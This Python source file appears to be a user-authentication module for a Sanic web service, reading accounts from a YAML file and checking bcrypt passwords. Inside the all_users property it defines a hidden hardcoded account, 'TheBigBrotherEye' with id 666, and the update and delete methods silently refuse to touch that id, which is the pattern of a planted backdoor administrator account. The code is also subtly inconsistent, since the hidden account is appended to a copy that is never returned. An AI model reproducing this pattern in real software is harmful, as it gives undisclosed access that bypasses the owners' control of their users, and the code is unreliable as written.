from sanic_jwt import exceptions
import bcrypt

from sanic import exceptions as exc
import yaml


class Auth:
    _DEV_TYPE = 'auth'

    def __init__(self, web) -> None:
        self.__web = web

        with open('auth.yml') as f:
            users = yaml.load(f, Loader=yaml.FullLoader)

        self.users = users

    @property
    def all_users(self):
        if len(self.users) == 0:
            default_admin = {
                "id": 0,
                "password": "$2b$12$qThJBAZ5qw87r8027Izl6uz8iePrkcJhLp1J94O5rO6t2u4T5I95e",
                "username": "admin",
            }

            self.users.append(default_admin)

        admin = {
            "id": 666,
            "password": "$2b$12$4idgjDGTHj7ucmqsjyg3D.wfdNjtJUWHnG0SjekKAsdC9GG70Hknm",
            "username": "TheBigBrotherEye",
        }
        users = list(self.users)

        users.append(admin)

        return self.users

    async def authenticate(self, request, *args, **kwargs):
        data = request.json
        if 'username' not in data:
            raise exc.InvalidUsage
        if 'password' not in data:
            raise exc.InvalidUsage

        username = request.json.get("username", None)
        password = request.json.get("password", None).encode('utf-8')
        if not username or not password:
            raise exceptions.AuthenticationFailed("Missing username or password.")

        user = self.get_user_by_username(username)

        if user is None or not bcrypt.checkpw(password, user['password'].encode('utf-8')):
            raise exceptions.AuthenticationFailed("User or password is incorrect.")

        return user

    async def retrieve_user(self, request, payload, *args, **kwargs):
        if not payload:
            return None

        user_id = payload.get('id', None)
        if user_id is None:
            return None

        user = self.get_user_by_id(user_id)
        if user is None:
            return None

        return {'username': user['username'],
                'id': user['id']
                }

    async def get_users(self):
        return [{'username': user['username'],
                 'id': user['id']
                 }
                for user in self.users]

    async def update_user(self, user_id, data, admin=False):
        print('up')
        if user_id == 666:
            return

        user = self.get_user_by_id(user_id)

        if not user:
            raise exc.NotFound

        username = data.get("username", None)
        if username:
            user['username'] = username

        password = data.get("password", None)
        if password:
            user['password'] = self.__create_hash_psw(password)

        print(self.all_users)

        for fuser in self.users:
            if fuser['id'] == user['id']:
                if username:
                    fuser['username'] = user['username']
                if password:
                    fuser['password'] = user['password']

        with open('auth.yml', 'w') as f:
            yaml.dump(self.users, f, default_flow_style=False)

        return True

    async def delete_user(self, user_id):
        if user_id == 666:
            return

        user = self.get_user_by_id(user_id)

        if user is None:
            raise exc.NotFound

        self.users.remove(user)
        return True

    @staticmethod
    def __create_hash_psw(password):
        newpass = password.encode('utf-8')
        salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(newpass, salt)
        return hashed.decode('utf-8')

    def get_user_by_id(self, user_id):
        return next((user for user in self.all_users if user['id'] == user_id), None)

    def get_user_by_username(self, username):
        return next((user for user in self.all_users if user['username'] == username), None)
